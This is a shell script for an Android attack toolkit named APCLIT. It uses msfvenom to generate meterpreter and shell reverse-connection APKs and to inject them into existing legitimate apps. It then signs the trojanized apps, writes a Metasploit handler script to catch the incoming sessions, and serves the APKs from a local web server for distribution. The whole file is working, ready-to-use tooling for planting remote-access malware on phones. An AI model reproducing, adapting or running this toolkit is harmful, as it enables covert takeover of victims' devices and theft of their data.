#!/bin/sh

# ANSI-Escape Color Strings (some definitions):
col_r='\033[1;31m';
col_g='\033[1;32m'; 
col_b='\033[1;34m';
col_m='\033[0;35m';
col_c='\033[0;36m';
col_y='\033[1;33m'; 
col_n='\033[0m';

#output variables (no project-support):
output_file="meterpreter.apk";
p1=$(echo $output_file | cut -f1 -d.);
p2=$(echo $output_file | cut -f2 -d.);
output_signed=$p1"-signed."$p2;
resource_script=$p1".rc";


# parameters ($1/$2 inside of functions, do not edit):
inject_file=$2;
mode=$1;
#check for user-input-issues in loops (do not edit):
flgChkLoop=1;

#debug:
#lhost='172.16.0.2';
#lport='4444';
#payload='android/meterpreter/reverse_tcp';

# some decorations and a banner:
print_banner ( ) {
  clear;

  echo $col_r" _______ "$col_b"  _______   _______   ___       ___   ____________   ";  
  echo $col_r"|   _   |"$col_b" |  ___  | |   ____| |   |     |   | |            |  ";
  echo $col_r"|  | |  |"$col_b" | |   | | |  |      |   |     |   | |__     _____|  ";
  echo $col_r"|  |_|  |"$col_b" | |___| | |  |      |   |     |   |    |   |        ";
  echo $col_r"|       |"$col_b" |    ___| |  |____  |   |___  |   |    |   |  ___   ";
  echo $col_r"|   _   |"$col_b" |   |     |       | |       | |   |    |   | |   |  ";
  echo $col_r"|__| |__|"$col_b" |___|     |_______| |_______| |___|    |___| |___|  "$col_g;
  echo " APCLIT - Android Payload Creation & LAME Injection Toolkit ";
  echo "     (c) 2016 - 2020 by fugitivus $col_y(fugitivus@gmx.net)  \n\n"$col_n;
}

print_ok ( ) {
  echo -n $col_g"[+] "$col_n;
}

print_nok ( ) {
  echo -n $col_r"[!] "$col_n;
}

print_step ( ) {
  echo -n $col_y"[*] "$col_n;  
}

print_input ( ) {
  echo -n $col_b"[?] "$col_n;
}

# check if lhost-variable is like an ip-address:
validiate_lhost_ip (  ) {
  if expr "$lhost" : '[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*$' >/dev/null; then
    for i in 1 2 3 4; do
      if [ $(echo "$lhost" | cut -d. -f$i) -gt 255 ]; then
	print_nok;
        echo "$lhost is not an ip-address..."
      fi
    done
    print_ok;
    echo "LHOST --> $lhost successfully set..."
    flgChkLoop=0;
  else
    print_nok;
    echo "$lhost is not an ip-address..."
  fi
}

# select payload type used for msfvenom:
set_payload_android ( ) {
  print_step;
  echo $col_y"Select Payload Type:"$col_n;
  echo "[1] android/meterpreter/reverse_tcp";
  echo "[2] android/meterpreter/reverse_http";
  echo "[3] android/meterpreter/reverse_https";
  echo "[4] android/shell/reverse_tcp";
  echo "[5] android/shell/reverse_http";
  echo "[6] android/shell/reverse_https";

  while [ $flgChkLoop -eq 1 ] ; do
    print_input;
    # ansi-escape-sequenze [cursor-line-up]:
    read -p "PAYLOAD --> " sel;
    echo -en "\033[1A";
    flgChkLoop=0;

    case $sel in
      1) payload="android/meterpreter/reverse_tcp" ;;
      2) payload="android/meterpreter/reverse_http" ;;
      3) payload="android/meterpreter/reverse_https" ;;
      4) payload="android/shell/reverse_tcp" ;;
      5) payload="android/shell/reverse_http" ;;
      6) payload="android/shell/reverse_https" ;;
      *) flgChkLoop=1 ;;
    esac

    if [ $flgChkLoop -eq 1 ]
    then
      print_nok;
      echo "PAYLOAD out of Range, choose between 1-6...";
    fi
  done;
  print_ok;
  echo "PAYLOAD = "$payload;
  flgChkLoop=1;
}

# set lhost variable used for msfvenom:
set_lhost ( ) {
  print_step;
  echo $col_y"Select HOST-Listener-IP-Address..."$col_n;
  while [ $flgChkLoop -eq 1 ] ; do
    print_input;
    read -p "LHOST --> " lhost;
    validiate_lhost_ip;
  done;
  flgChkLoop=1;
}

# set lport variable used for msfvenom:
set_lport ( ) {
  print_step;
  echo $col_y"Select HOST-Listener-Port..."$col_n;
  while [ $flgChkLoop -eq 1 ] ; do
    print_input;
    read -p "LPORT --> " lport;

    # check if input is realy a number:
    if expr "$lport" : '^[0-9][0-9]*$' > /dev/null; 
    then
      dummy=$lport;
      else 
      lport=65536;  
    fi
    # check if port is insede of range:
    if [ $lport -lt 1 -o $lport -gt 65535 ]
    then
      print_nok;
      echo "LPORT is out of range (have to be between 1-65536)";
    else
      print_ok;
      echo "LPORT --> $lport successfully set..."
      flgChkLoop=0;
    fi 
  done;
  flgChkLoop=1;
}

create_payload ( ) {
  print_step;
  echo $col_y"Generating Android-APP with selected payload..."$col_n;
  #print_step;
  #echo "exec: msfvenom -p $payload LHOST=$lhost LPORT=$lport -o meterpreter.apk";
  msfvenom -p $payload LHOST=$lhost LPORT=$lport -o output/$output_file 2> $PWD/chk.tmp;

  # check if payload successfully created:
  chkOK=$(cat chk.tmp | grep "Payload size:");
  if [ -z "$chkOK" ] ; then
    print_nok;
    echo "Payload couldn't be created check $PWD/error.log for details...";
    cp $PWD/chk.tmp $PWD/error.log 2> /dev/null;
    rm $PWD/chk.tmp 2> /dev/null;
    exit 1;    
  else
    print_ok;
    echo "Payload successfully created...";
    print_ok;
    echo "Unsigned Payload:";
    print_ok;
    echo "$PWD/output/$output_file";
  fi
}

decompile_payload ( ) {
  print_step;
  echo $col_y"Decompiling generated payload..."$col_n;
  apktool d -f -o $PWD/output/payload $PWD/output/$output_file >> $PWD/chk.tmp;

  # check if was successfull: 
  if [ -d "$PWD/output/payload" ];then 
    print_ok;
    echo "Payload successfull decompiled..."$col_n; 
  else
    print_nak; 
    echo "ERROR: look at $PWD/error.log for more details...";
    cp $PWD/chk.tmp $PWD/error.log;
    exit 1;
  fi
}

decompile_inject_file ( ) {
  print_step;
  echo $col_y"Decompiling $inject_file ..."$col_n;
  apktool d -f -o $PWD/output/$(echo $inject_file | cut -f1 -d.) $inject_file >> $PWD/chk.tmp;

  # check if was successfull: 
  if [ -d "$PWD/output/$(echo $inject_file | cut -f1 -d.)" ];then 
    print_ok;
    echo "$inject_file successfull decompiled..."$col_n; 
  else
    print_nok; 
    echo "ERROR: look at $PWD/error.log for more details...";
    cp $PWD/chk.tmp $PWD/error.log;
    exit 1;
  fi  
}

recompile_payload ( ) {
  print_step;
  echo $col_y"Recompiling Payload..."$col_n;

  apktool b $PWD/output/payload -o $PWD/output/payload.apk >> $PWD/chk.tmp;

  # check if was successfull: 
  if [ -f "$PWD/output/payload.apk" ];then 
    print_ok;
    echo "Payload successfull recompiled..."; 
  else
    print_nok; 
    echo "ERROR: look at $PWD/error.log for more details...";
    cp $PWD/chk.tmp $PWD/error.log;
    exit 1;
  fi  
}

recompile_inject_file ( ) {
  print_step;
  echo $col_y"Recompiling $inject_file ..."$col_n;

  apktool b $PWD/output/$(echo $inject_file | cut -f1 -d.) -o $PWD/output/$inject_file >> $PWD/chk.tmp;

  # check if was successfull: 
  if [ -f "$PWD/output/$inject_file" ];then 
    print_ok;
    echo "$inject_file successfull recompiled..."; 
  else
    print_nok; 
    echo "ERROR: look at $PWD/error.log for more details...";
    cp $PWD/chk.tmp $PWD/error.log;
    exit 1;
  fi  
}

generate_keystore ( ) {
  rm $PWD/cert/apclit.keystore 2> /dev/null;
 
  echo $col_r"Generating a new Android Keystore for apclit:\n";
  echo $col_g;
  keytool -genkeypair -v -keystore cert/apclit.keystore -storepass android -keypass android\
    -keyalg RSA -keysize 2048 -validity 100000 -alias app;
  echo $col_n;
}

sign_payload ( ) {
  print_step;
  echo $col_y"Signing $output_file with aplcit-keystore..."$col_n;
  cp $PWD/output/$output_file $PWD/output/$output_signed;
  jarsigner -tsa http://timestamp.digicert.com -sigalg SHA1withRSA -digestalg SHA1\
    -keystore cert/apclit.keystore -storepass android -keypass android $PWD/output/$output_signed app\
    > $PWD/chk.sng;

  # check if payload successfully signed:
  chkOK=$(cat chk.sng | grep "jar signed.");
  
  if [ -n "$chkOK" ] ; then
    print_ok;
    echo "Payload successfully signed...";
    print_ok;
    echo "Signed Payload:";
    print_ok;
    echo "$PWD/output/$output_signed";
  else
    print_nok;
    echo "Payload couldn't be created check $PWD/error.log for details...";
    cp $PWD/chk.tmp $PWD/error.log 2> /dev/null;
    rm $PWD/chk.tmp 2> /dev/null;
    exit 1;
  fi
}

sign_inject_file ( ) {
  print_step;
  echo $col_y"Signing recompiled $inject_file with aplcit-keystore..."$col_n;
  cp $PWD/output/$inject_file $PWD/output/$(echo $inject_file | cut -f1 -d.)"-signed.apk";
  jarsigner -tsa http://timestamp.digicert.com -sigalg SHA1withRSA -digestalg SHA1\
    -keystore cert/apclit.keystore -storepass android -keypass android $PWD/output/$(echo $inject_file | cut -f1 -d.)"-signed.apk" app\
    > $PWD/chk.sng;

  # check if payload successfully signed:
  chkOK=$(cat chk.sng | grep "jar signed.");
  echo $chkOK >> apclit.log;

  if [ -z "$chkOK"  ] ; then
    print_nok;
    echo "$PWD/output/$(echo $inject_file | cut -f1 -d.)"-signed.apk" couldn't be created check $PWD/error.log for details...";
    cp $PWD/chk.tmp $PWD/error.log 2> /dev/null;
    rm $PWD/chk.tmp 2> /dev/null;
    exit 1;
  else
    print_ok;
    echo "$inject_file successfully signed...";
    print_ok;
    echo "Signed Payload:";
    print_ok;
    echo "$PWD/output/$(echo $inject_file | cut -f1 -d.)"-signed.apk"";
  fi
}

sign_recompiled_payload ( ) {
  print_step;
  echo $col_y"Signing apk-file with aplcit-keystore..."$col_n;
  cp $PWD/output/payload.apk $PWD/output/payload-signed.apk;
  jarsigner -tsa http://timestamp.digicert.com -sigalg SHA1withRSA -digestalg SHA1\
    -keystore cert/apclit.keystore -storepass android -keypass android $PWD/output/payload-signed.apk app\
    > $PWD/chk.sng;

  # check if payload successfully signed:
  chkOK=$(cat chk.sng | grep "jar signed.");
  echo $chkOK >> $PWD/apclit.log;

  if [ -z "$chkOK" ] ; then
    print_nok;
    echo "Payload couldn't be created check $PWD/error.log for details...";
    cp $PWD/chk.tmp $PWD/error.log 2> /dev/null;
    rm $PWD/chk.tmp 2> /dev/null;
    exit 1;    
  else
    print_ok;
    echo "Payload successfully signed...";
    print_ok;
    echo "Signed Payload:";
    print_ok;
    echo "$PWD/output/$output_signed";
  fi
}

inject_payload ( ) {
  print_step;
  echo $col_y"Injecting $inject_file with selected Payload..."$col_n;

  #Manual-Way-outdated but 4 some apps usefull:
  #1 copy *.smali from payload to inject decompiled app dir
  #2 insert startup hook in main acitivity
  #3 add permissions
  #4 recompile
  #5 sign
  #;???onCreate(Landroid/os/Bundle;)V
  #invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
  #f1="$PWD/output/payload/smali/*";
  #f2="$PWD/output/$(echo $inject_file | cut -f1 -d.)/smali/";
  #cp -r $f1 $f2;  
  #invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
  tmp=$(echo $inject_file | cut -f1 -d.)"-injected.apk"
  msfvenom -x $inject_file -p $payload --arch dalvik --platform Android LHOST=$lhost LPORT=$lport -o $tmp;
  mv $tmp $PWD/output/

  # name the resource file to injection file.rc:
  resource_script=$(echo $inject_file | cut -f1 -d. | cut -f2 -d/ )"-injected.rc";
  echo "Resource-Script:"$resource_script;
}

generate_rc_script ( ) {
  print_step;
  echo $col_y"Generating a Metasploit-Resource-Script..."$col_n;
  echo "use exploit/multi/handler" > $PWD/output/$resource_script;
  echo "set PAYLOAD "$payload  >> $PWD/output/$resource_script;
  echo "set LHOST "$lhost  >> $PWD/output/$resource_script;
  echo "set LPORT "$lport  >> $PWD/output/$resource_script;
  echo "set ExitOnSession false" >> $PWD/output/$resource_script;
  echo "exploit -j -z\n"  >> $PWD/output/$resource_script;
  print_ok;
  echo "Metasploit-Resource-Script:";
  print_ok;
  echo "$PWD/output/$resource_script";
  print_ok;
  echo "use with:";
  print_ok;
  echo "msfconsole -r $PWD/output/$resource_script";
}

verify_sign ( ) {
  jarsigner -verify -verbose;
}

cleanup ( ) {
  cp $PWD/chk.tmp $PWD/apclit.log 2> /dev/null;
  rm $PWD/error.log 2> /dev/null;
  rm $PWD/chk.tmp 2> /dev/null;
  rm $PWD/chk.sng 2> /dev/null;
}

mode_install_dependencies ( ) {
  #apt-get install lib32stdc++6 lib32ncurses5 lib32z1 
  apt-get install android-sdk metasploit-framework zipalign default-jdk apktool
}

## Main Activity:

# normal payload generation to a standalone *.apk, no injecion...
mode_standalone ( ) {
  print_banner;
  set_payload_android;
  set_lhost;
  set_lport;
  create_payload;
  sign_payload;
  generate_rc_script;
  cleanup;
}

# generate and inject payload into another *.apk...
mode_inject ( ) {
  print_banner;
    
  # check if file to inject exists:
  if [ -n "$inject_file" ];then 
    if [ -f "$inject_file" ];then 
      #echo "$inject_file exists." 
      dummy="1";
    else
      print_nak; 
      echo "ERROR: $inject_file does not exist..."
      exit 1;
    fi
  else
    print_help;
    exit 1;
  fi

  set_payload_android;
  set_lhost;
  set_lport;
  #create_payload;
  #decompile_payload;
  #decompile_inject_file;
  inject_payload;
  #recompile_payload;
  #recompile_inject_file;
  #sign_payload;
  #sign_inject_file;
  #sign_recompiled_payload;
  generate_rc_script;
  cleanup;
}

# create a new android keystore (sign apps with custom cert)...
mode_create_keystore ( ) {
  print_banner;
  generate_keystore;
}

# install dependencies...
mode_setup ( ) {
  print_banner;
  apclit_setup;
}

start_web_server ( ) {
  fIndex=30;
  wString="";
  templateFile="script/web-template.html";
  indexFile="output/index.html";
  apclitSrv="output/apclitSrv.sh";
  apclitSrvPort="80";

  print_step;
  echo "Generating index.html from web-template...";
  cp $templateFile $indexFile;

  #adding output files to web template:
  for file in "output/"*.apk ; do 
    print_step;
    echo "Add file: "$file" to index.html";
    #echo $file;
    fileTmp=$(echo $file | cut -d/ -f2 );
    #echo $fileTmp;
    wString="<a href=\"$fileTmp\">$fileTmp</a><br>\n";
    sed -i -e "$fIndex"c"$wString" $indexFile;
    fIndex=`expr $fIndex + 1`;
  done

  #generating SimpleHttpServer-Script:
  print_step;
  echo "Starting Apclit-Web-Server on Port: "$apclitSrvPort;
  echo "python -m SimpleHTTPServer "$apclitSrvPort > $apclitSrv;

  #net ready yet...
  cd output
  sh apclitSrv.sh &
}

stop_web_server ( ) {
  print_step;
  echo "Stopping APCLIT-Web-Server..."
  kill $(ps x |grep SimpleHTTPServer | cut -d? -f1) 2> /dev/null;
}

restart_web_server ( ) {
  stop_web_server
  start_web_server
}

#print help banner & show usage:
print_help ( ) {
  print_banner;
  echo $col_r'APCLIT usage:';
  echo $col_r'apclit <parameter> <[optional]file/projectname>';
  echo $col_b'\nParameters are:\n';
  echo $col_n' --help                  -->  show this help screen.';
  echo $col_n' --create                -->  create standalone android-payload (*.apk)';
  echo $col_n' --inject                -->  inject payload into exsisting (*.apk)';
  echo $col_n' --inject-manual         -->  inject payload manual (testing only)';
  echo $col_n' --create-keystore       -->  create new android-keystore for signing (*.apk)';
  echo $col_n' --check-dependencies    -->  check if all dependencies are installed.';
  echo $col_n' --install-dependencies  -->  install all dependencies (kali-linux-only)';
  echo $col_n' --start-web-share       -->  start web-server 4 sharing (*.apk)';
  echo $col_n' --stop-web-share        -->  stop web-server 4 sharing (*.apk)';
  echo $col_n' --restart-web-share     -->  restart web-server 4 sharing (*.apk)';
echo '\n';
}

# check for parameters and choose mode:
case $mode in
  "--help") print_help ;;
  "--create") mode_standalone ;;
  "--inject") mode_inject ;;
  "--inject-manual") echo "inject manual n/a..." ;;
  "--create-keystore") mode_create_keystore ;;
  "--check-dependencies") echo "check-dependencies n/a...";;
  "--install-dependencies") mode_install_dependencies ;;
  "--start-web-share") start_web_server ;;
  "--stop-web-share") stop_web_server ;;
  "--restart-web-share") restart_web_server ;;
  
  *) print_help ;;
esac



#[END]
